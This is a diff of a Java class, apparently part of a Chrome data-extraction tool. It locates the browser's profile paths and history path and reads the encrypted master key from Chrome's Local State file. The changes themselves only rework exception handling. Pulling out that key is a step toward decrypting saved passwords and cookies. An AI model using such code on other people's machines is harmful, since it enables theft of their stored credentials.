@@ -1,8 +1,11 @@
 import java.util.*;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileReader;
+import java.io.IOException;
 
 import org.json.simple.parser.JSONParser;
+import org.json.simple.parser.ParseException;
 import org.json.simple.JSONObject;
 
 class ChromeInstallation{
@@ -16,16 +19,11 @@ class ChromeInstallation{
 	private static String profileName;
 
 	public static void getInstallationData(){
-		try{
 			getInstallationPaths();
 			getLocalStateData();
-		}catch(Exception e){
-			System.out.println("[*] Exception occurred: "+e+"\n[*] Terminating");
-			System.exit(0);
-		}
 	}
 
-	private static void getInstallationPaths() throws Exception{
+	private static void getInstallationPaths(){
 		File chrome_directory = new File(chromeInstallationPath);
 		if(chrome_directory.exists()){
 			String[] directory_list = chrome_directory.list(); 
@@ -64,15 +62,28 @@ class ChromeInstallation{
 			System.exit(0);
 		}
 	}
-	private static void getLocalStateData() throws Exception{
+	private static void getLocalStateData(){
 		JSONParser jsonParser = new JSONParser();
-		JSONObject rootObject = (JSONObject) jsonParser.parse(new FileReader(localStatePath));
-		JSONObject user_metrics = (JSONObject) rootObject.get("user_experience_metrics");
-		JSONObject stability = (JSONObject) user_metrics.get("stability");
-		chromeVersion = (String) stability.get("stats_version");
+		JSONObject rootObject;
+		try{
+			rootObject = (JSONObject) jsonParser.parse(new FileReader(localStatePath));
+			JSONObject user_metrics = (JSONObject) rootObject.get("user_experience_metrics");
+			JSONObject stability = (JSONObject) user_metrics.get("stability");
+			chromeVersion = (String) stability.get("stats_version");
 
-		JSONObject os_crypt = (JSONObject) rootObject.get("os_crypt");
-		chromeMasterKey = (String) os_crypt.get("encrypted_key");
+			JSONObject os_crypt = (JSONObject) rootObject.get("os_crypt");
+			chromeMasterKey = (String) os_crypt.get("encrypted_key");
+		}catch(FileNotFoundException e){
+			System.out.println("[*] Chrome Installation Files missing. Try reinstalling chrome");
+			System.exit(0);
+		}catch(IOException e){
+			System.out.println("[*] IOException occurred while reading chrome installation files");
+			System.exit(0);
+		} catch (ParseException e) {
+			System.out.println("[*] ParseException occurred while parsing local state json files");
+			System.exit(0);
+		}
+		
 	}
 	public static String getHistoryPath(){
 		return historyPath;
